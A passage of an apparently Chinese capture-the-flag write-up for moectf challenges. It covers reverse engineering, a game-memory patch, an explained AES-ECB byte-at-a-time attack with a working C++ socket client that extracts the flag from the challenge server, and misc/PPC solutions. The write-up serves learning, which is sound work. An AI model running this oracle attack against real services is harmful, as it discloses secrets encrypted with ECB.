class="string">&quot;bX;oY4Tpe4D8Q2;VRW:&#123;U2;IQIP8fR?@&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;orig.<span class="built_in">size</span>();i++)</span><br><span class="line">        orig[i]-=i%<span class="number">4</span>;</span><br><span class="line">    </span><br><span class="line">    cout&lt;&lt;orig;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>base64一下<br><code>moectf&#123;pyC_RE_1S_E@sy&#125;</code></p><h4 id="玩过2048么？">玩过2048么？</h4><p>那当然是玩过啦</p><p>但是玩不到4096怎么办啊…<br>那当然是修改器啦</p><p>用八门神器(误)IDA找到4096(1000h)改成16(10h)</p><h2 id="CRYPTO">CRYPTO</h2><h4 id="Open-the-door-of-Crypto">Open the door of Crypto</h4><p>熟练使用openssl<br>熟练使用factordb<br>熟练使用notepad</p><h4 id="ECB-Attack">ECB_Attack</h4><ul><li>AES背景知识</li></ul><p>AES是一种”对称加密”方式，与以RSA为代表的”非对称加密”相对，用同一个密钥进行加密和解密。AES分多种加密模式，其中ECB模式是最简单最易实现的一种。带来便利性的同时，ECB也有一些小缺陷，在某些时候，如果使用不当，AES-ECB有可能带来巨大的灾难。</p><ul><li>ECB加密过程</li></ul><p>进行ECB加密时，首先要将字符串分割成相等的几部分(称为block)。为方便表示，此处以3个字符为一个block进行演示，不展示密钥对明文加密的过程。</p><p>做出以下假设：</p><table><thead><tr><th>明文</th><th>密文</th></tr></thead><tbody><tr><td>aaa</td><td>ciph1</td></tr><tr><td>aab</td><td>ciph2</td></tr><tr><td>aba</td><td>ciph3</td></tr><tr><td>bba</td><td>ciph4</td></tr></tbody></table><p>这时当我们对字串</p><p><code>aaaaaa</code></p><p>进行加密时，便可以得到密文</p><p><code>ciph1ciph1</code></p><p>ECB的缺陷何在?</p><blockquote><p>ECB的每个block前后文不相关，即每个block单独加密，不与其他block相呼应</p></blockquote><p>实行一次攻击的条件：</p><ul><li>攻击方能够控制字串一定部分的长度</li><li>攻击方了解需要获取的信息目标之前的一段信息</li><li>攻击方已知字串以某一未知密钥加密后的密文</li><li>攻击方能够多次数获取某一字符串以相同密钥加密后的密文</li></ul><p>假设我们能控制从某一字符串开始处的内容长度，并且了解到字符串的结构为</p><p><code>[controllable]aaa[target],block=3</code></p><p>当我们控制<code>[controllable]</code>部分为<code>bb</code>时，字符串为</p><p><code>bbaaa[target]</code></p><p>切分block后为</p><p><code>bba aa[target_0] [target_1-end]</code></p><p>现在我们已知整个字符串的密文为</p><p><code>ciph4ciph2ciph5</code></p><p>则通过尝试对第二个block进行填充并加密可以试出target_0的值为b<br>现缩短[controllable]部分长度，更改为&quot;b&quot;,则字串变为</p><p><code>baaa[target]</code></p><p><code>baa a[target_0][target_1] [target_2-end]</code></p><p>此时已知第二个block的内容为”ab[target_1]”，再次尝试可以获得target第二位的值<br>现更改[controllable]部分为”bbbb”,字串切分后为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bbb baa a[target_0][target_1] [target_2-end]</span><br></pre></td></tr></table></figure><p>其效果与<code>[controllable]=&quot;b&quot;</code>相当,但给我们留下了更多的缩短余地。</p><ul><li>回到原题</li></ul><p>通过多次尝试，不难发现字符串每16个字符划分一个block，作者又给了我们源代码以供参考，连接到服务器后发送来的消息中包含了flag。我们需要控制name长度来”缩”出来flag</p><p><code>hello, [name], your mission's flag is: [flag]</code></p><p>于是我们可以写个python来跑，然而我太弱了不会python，CinCPP将就着看吧</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;Ws2_32.lib &quot;</span>)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">namespace</span> ECB_Atack &#123;</span><br><span class="line">SOCKET server;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">read</span><span class="params">(string &amp;i)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> buffer[<span class="number">2048</span>];</span><br><span class="line"><span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span> buffer);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">recv</span>(server, buffer, <span class="built_in">sizeof</span>(buffer), <span class="number">0</span>) == SOCKET_ERROR) &#123;</span><br><span class="line"><span class="built_in">closesocket</span>(server);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;read error&quot;</span>;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">i = buffer;</span><br><span class="line"><span class="keyword">if</span> (i.<span class="built_in">size</span>())<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">put</span><span class="params">(string m)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (m[m.<span class="built_in">size</span>() - <span class="number">1</span>] != <span class="string">&#x27;\n&#x27;</span>)m += <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;[message send]&quot;</span> &lt;&lt; m;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">send</span>(server, m.<span class="built_in">c_str</span>(), m.<span class="built_in">size</span>(), <span class="number">0</span>) == SOCKET_ERROR) &#123;</span><br><span class="line"><span class="built_in">closesocket</span>(server);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;put error&quot;</span>;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">150</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">string <span class="title">expect_reply</span><span class="params">(string message)</span> </span>&#123;</span><br><span class="line"><span class="built_in">put</span>(message);</span><br><span class="line"><span class="built_in">read</span>(message);</span><br><span class="line"><span class="keyword">return</span> message;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> visible_char[] = </span><br><span class="line"><span class="string">&quot; 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;#$%&amp;\\\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~&quot;</span>;</span><br><span class="line"></span><br><span class="line">string banner_encrypted;</span><br><span class="line">string flag_uncovered;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ECB_Atack_main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">WSAData wd;</span><br><span class="line">(<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wd));</span><br><span class="line"></span><br><span class="line">string message;</span><br><span class="line">string name;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">30</span>; i &gt; <span class="number">0</span>; i--) &#123;<span class="comment">//30=14+16</span></span><br><span class="line">ECB_Atack::server = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">SOCKADDR_IN addrServ;</span><br><span class="line">addrServ.sin_family = AF_INET;</span><br><span class="line">addrServ.sin_port = <span class="built_in">htons</span>(<span class="number">9997</span>);</span><br><span class="line">addrServ.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;123.56.218.81&quot;</span>);</span><br><span class="line"><span class="type">int</span> ret = <span class="built_in">connect</span>(ECB_Atack::server, (SOCKADDR*)&amp;addrServ, <span class="built_in">sizeof</span>(SOCKADDR));</span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == ret) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket connect failed\n&quot;</span>);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="built_in">closesocket</span>(ECB_Atack::server);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">name = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++)name += <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">ECB_Atack::<span class="built_in">read</span>(message);</span><br><span class="line">ECB_Atack::<span class="built_in">put</span>(name);</span><br><span class="line">ECB_Atack::<span class="built_in">read</span>(message);</span><br><span class="line">string encrypted_banner = message.<span class="built_in">substr</span>(<span class="number">0</span>, message.<span class="built_in">find</span>(<span class="string">&quot;\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">string constructed_banner = <span class="string">&quot;hello, &quot;</span> + name + <span class="string">&quot;, your mission&#x27;s flag is: &quot;</span>;</span><br><span class="line"><span class="type">int</span> known_bits = constructed_banner.<span class="built_in">size</span>() % <span class="number">16</span>;<span class="comment">//block size</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//check valid;</span></span><br><span class="line">ECB_Atack::<span class="built_in">put</span>(constructed_banner.<span class="built_in">substr</span>(<span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">ECB_Atack::<span class="built_in">read</span>(message);</span><br><span class="line">message = message.<span class="built_in">substr</span>(<span class="number">0</span>, message.<span class="built_in">find</span>(<span class="string">&quot;\n&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> (encrypted_banner.<span class="built_in">find</span>(message) == <span class="number">-1</span>)</span><br><span class="line"><span class="built_in">assert</span>(<span class="string">&quot;what the...&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//jump to last block</span></span><br><span class="line">string last_block = </span><br><span class="line">constructed_banner.<span class="built_in">substr</span>(<span class="number">16</span> * <span class="built_in">int</span>(constructed_banner.<span class="built_in">size</span>() / <span class="number">16</span>));</span><br><span class="line">string payload = last_block + ECB_Atack::flag_uncovered;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">96</span>; i++) &#123;</span><br><span class="line">ECB_Atack::<span class="built_in">put</span>(payload + ECB_Atack::visible_char[i]);</span><br><span class="line">ECB_Atack::<span class="built_in">read</span>(message);</span><br><span class="line">message = message.<span class="built_in">substr</span>(<span class="number">0</span>, message.<span class="built_in">find</span>(<span class="string">&quot;\n&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> (encrypted_banner.<span class="built_in">find</span>(message)!=<span class="number">-1</span>) &#123;</span><br><span class="line">ECB_Atack::flag_uncovered += ECB_Atack::visible_char[i];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">closesocket</span>(ECB_Atack::server);</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; ECB_Atack::flag_uncovered;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="MISC">MISC</h2><h4 id="BASE64">BASE64</h4><p>如题目要求，将文本进行base64解码即可得到flag</p><blockquote><p>题外话：熟悉base64,32,16编码的过程对RE帮助极大</p></blockquote><h4 id="凯撒密码">凯撒密码</h4><blockquote><p>密码学(?)的鼻祖(?)凯撒将凯撒密码用于战争中的密令传递，开辟了(???)新的战争空间(胡诌)</p></blockquote><p>将每一位拉丁字母按a-z的顺序向后推即可<br>遇到题目中没有给出密钥的情况。。。可以把26种可能全打出来找合理的</p><p>####栅栏密码</p><p>错位重组<br>遇到栅栏密码加密过的字符串s时可以优先尝试密钥divisor(|s|),其中divisor(x)表示的因数</p><h4 id="zip伪加密">zip伪加密</h4><p>先修复加密位，将单数改成双数(00)<br>修复了加密位的我一脸懵逼，直到我向shell里输入了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk zip</span><br></pre></td></tr></table></figure><p>欸。。。怎么没有zip头。。。<br>修复zip头，拿flag</p><h4 id="backdoor">backdoor</h4><p>流量分析<br>看到50 4B的那一刻就跳起来了</p><h4 id="弄脏的二维码">弄脏的二维码</h4><p>修复定位符，剩下的交给QR code的容错</p><h4 id="蒙娜丽圆的微笑">蒙娜丽圆的微笑</h4><p>emmmmm<br>小圆圆！小圆圆！<br>拿ps或者其他什么逐帧浏览</p><h4 id="miku’s-secret">miku’s secret</h4><p>收集隐写工具大比拼<br>这个工具<br>lsb隐写，密钥在二维码里</p><h2 id="PPC">PPC</h2><p>emmmmm 这PPC跟我想象的不太一样啊</p><h4 id="BAT">BAT</h4><p>无脑编程题，没本事拿bat解。</p><h4 id="Cirno">Cirno</h4><p>本来特别兴奋，多年闲置着的计算表达式的值的函数终于派上用场了，结果人家py自带计算表达式的值。<br>不管不管嘤嘤嘤我就拿 C in CPP</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;Ws2_32.lib &quot;</span>)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">stack&lt;<span class="type">char</span>&gt;operators;</span><br><span class="line">stack&lt;<span class="type">int</span>&gt; operands;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> operation = operators.<span class="built_in">top</span>();</span><br><span class="line">operators.<span class="built_in">pop</span>();</span><br><span class="line"><span class="type">int</span> a = operands.<span class="built_in">top</span>(); operands.<span class="built_in">pop</span>();</span><br><span class="line"><span class="type">int</span> b = operands.<span class="built_in">top</span>(); operands.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">switch</span> (operation) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">operands.<span class="built_in">push</span>(a + b);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">operands.<span class="built_in">push</span>(b - a);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">operands.<span class="built_in">push</span>(a*b);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line"><span class="keyword">if</span> (a == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (b%a)<span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//不能整除的话与咸鱼何异</span></span><br><span class="line">operands.<span class="built_in">push</span>(b / a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">cal</span><span class="params">(string expr)</span> </span>&#123;</span><br><span class="line"><span class="keyword">while</span> (!operators.<span class="built_in">empty</span>())operators.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">while</span> (!operands.<span class="built_in">empty</span>())operands.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; expr.<span class="built_in">length</span>(); i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (expr[i] == <span class="string">&#x27; &#x27;</span>)<span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (expr[i] == <span class="string">&#x27;+&#x27;</span> || expr[i] == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line"><span class="type">char</span> temp;</span><br><span class="line"><span class="keyword">while</span> (!operators.<span class="built_in">empty</span>() &amp;&amp;</span><br><span class="line">((temp = operators.<span class="built_in">top</span>()) == <span class="string">&#x27;+&#x27;</span> || temp == <span class="string">&#x27;-&#x27;</span> || temp == <span class="string">&#x27;*&#x27;</span> || temp == <span class="string">&#x27;/&#x27;</span>))</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">process</span>() == <span class="literal">false</span>)<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">operators.<span class="built_in">push</span>(expr[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (expr[i] == <span class="string">&#x27;*&#x27;</span> || expr[i] == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line"><span class="type">char</span> temp;</span><br><span class="line"><span class="keyword">while</span> (!operators.<span class="built_in">empty</span>() &amp;&amp;</span><br><span class="line">((temp = operators.<span class="built_in">top</span>()) == <span class="string">&#x27;*&#x27;</span> || (temp = operators.<span class="built_in">top</span>()) == <span class="string">&#x27;/&#x27;</span>))</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">process</span>() == <span class="literal">false</span>)<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">operators.<span class="built_in">push</span>(expr[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (i&lt;expr.<span class="built_in">length</span>() &amp;&amp; expr[i] &gt;= <span class="string">&#x27;0&#x27;</span>&amp;&amp;expr[i] &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">num *= <span class="number">10</span>;</span><br><span class="line">num += expr[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line">i--;</span><br><span class="line">operands.<span class="built_in">push</span>(num);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (operands.<span class="built_in">size</span>() &gt; <span class="number">1</span>)<span class="keyword">if</span> (<span class="built_in">process</span>() == <span class="literal">false</span>)<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">return</span> operands.<span class="built_in">top</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">char</span> <span class="title">to_symbol</span><span class="params">(<span class="type">int</span> i)</span> </span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (i) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:<span class="keyword">return</span> <span class="string">&#x27;+&#x27;</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:<span class="keyword">return</span> <span class="string">&#x27;-&#x27;</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:<span class="keyword">return</span> <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:<span class="keyword">return</span> <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SOCKET server;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">read</span><span class="params">(string &amp;i)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> buffer[<span class="number">2048</span>];</span><br><span class="line"><span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span> buffer);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">recv</span>(server, buffer, <span class="built_in">sizeof</span>(buffer), <span class="number">0</span>) == SOCKET_ERROR) &#123;</span><br><span class="line"><span class="built_in">closesocket</span>(server);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;read error&quot;</span>;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">i = buffer;</span><br><span class="line"><span class="keyword">if</span> (i.<span class="built_in">size</span>())<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">put</span><span class="params">(string &amp;m)</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;sent:&quot;</span> &lt;&lt; m &lt;&lt; endl;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">send</span>(server, m.<span class="built_in">c_str</span>(), m.<span class="built_in">size</span>(), <span class="number">0</span>) == SOCKET_ERROR) &#123;</span><br><span class="line"><span class="built_in">closesocket</span>(server);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;put error&quot;</span>;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">WSAData wd;</span><br><span class="line"><span class="comment">/*assert*/</span>(<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wd));</span><br><span class="line">server = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">SOCKADDR_IN addrServ;</span><br><span class="line">addrServ.sin_family = AF_INET;</span><br><span class="line">addrServ.sin_port = <span class="built_in">htons</span>(<span class="number">9998</span>);</span><br><span class="line">addrServ.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;123.56.218.81&quot;</span>);</span><br><span class="line"><span class="type">int</span> ret = <span class="built_in">connect</span>(server, (SOCKADDR*)&amp;addrServ, <span class="built_in">sizeof</span>(SOCKADDR));<span class="comment">//开始连接</span></span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == ret) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket connect failed\n&quot;</span>);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="built_in">closesocket</span>(server);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">string in;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">read</span>(in)) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in.<span class="built_in">find</span>(<span class="string">&quot;moectf&quot;</span>)!=<span class="number">-1</span>) &#123;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;flag found:&quot;</span> &lt;&lt; in &lt;&lt; endl;</span><br><span class="line"><span 